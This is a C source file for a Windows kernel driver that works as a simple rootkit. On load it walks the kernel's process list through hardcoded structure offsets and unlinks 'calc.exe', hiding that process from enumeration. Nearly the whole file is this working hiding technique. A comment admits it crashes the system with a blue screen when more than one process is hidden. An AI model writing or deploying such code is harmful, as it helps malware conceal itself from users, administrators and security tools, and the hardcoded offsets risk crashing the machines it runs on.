#include <ntifs.h>
#include <ntddk.h>
#include <string.h>


#define DeviceName L"\\Device\\driver"
#define LnkDeviceName L"\\DosDevices\\driver" 


void HideProcess(){
	PEPROCESS pEProcBefore;
	PEPROCESS pEProc;
	PEPROCESS pEProcFirst;
	PEPROCESS pEProcNext;
	int offset_name = 0x16c;
	int offset_lEntry = 0x0b8;
	char * name;
	char * hide_proc = "calc.exe";
	int guard;
	int flag_first;
	LIST_ENTRY * list_entry=NULL;
	LIST_ENTRY * list_entry_temp;
	int findProc;

	
	findProc = 1;
	pEProcFirst = IoGetCurrentProcess();
	pEProc = NULL;
	pEProcNext= pEProcFirst;
	

	guard =0;
	flag_first = 0;
	while(guard<100 && (pEProcFirst != pEProcNext || !flag_first) ){
		pEProc = pEProcNext;
	
		name = (PUCHAR) pEProc + offset_name;
		//DbgPrint("name: %s\n",name);

		findProc = strcmp(name,hide_proc);
		if(!findProc){
			DbgPrint("Initialize unlink process: %s\n",name);

			//catch eEProcBefore & eEProcNext
			list_entry= (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
			pEProcNext = (PEPROCESS)((PUCHAR) list_entry->Flink - offset_lEntry);
			pEProcBefore = (PEPROCESS)((PUCHAR) list_entry->Blink - offset_lEntry);
			
			//unlink
			list_entry_temp = (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
			
			list_entry = (LIST_ENTRY*)((PUCHAR) pEProcBefore + offset_lEntry);
			list_entry->Flink = list_entry_temp->Flink;

			list_entry = (LIST_ENTRY*)((PUCHAR) pEProcNext + offset_lEntry);
			list_entry->Blink = list_entry_temp->Blink;

			DbgPrint("Finish unlink process: %s\n",name);

			break;
			//findProc = 1; when try to sneak more than one process, it will work but we have blue screen after few seconds when driver uninstall
		}

	
		list_entry= (LIST_ENTRY*)((PUCHAR) pEProc + offset_lEntry);
	
		pEProcNext = (PEPROCESS)((PUCHAR) list_entry->Flink - offset_lEntry);
		guard++;
		flag_first = 1;
	}
	
}

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;
	
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
	
	if(NtStatus!=STATUS_SUCCESS)
			DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;
	
	HideProcess();
	
	return STATUS_SUCCESS;	
}

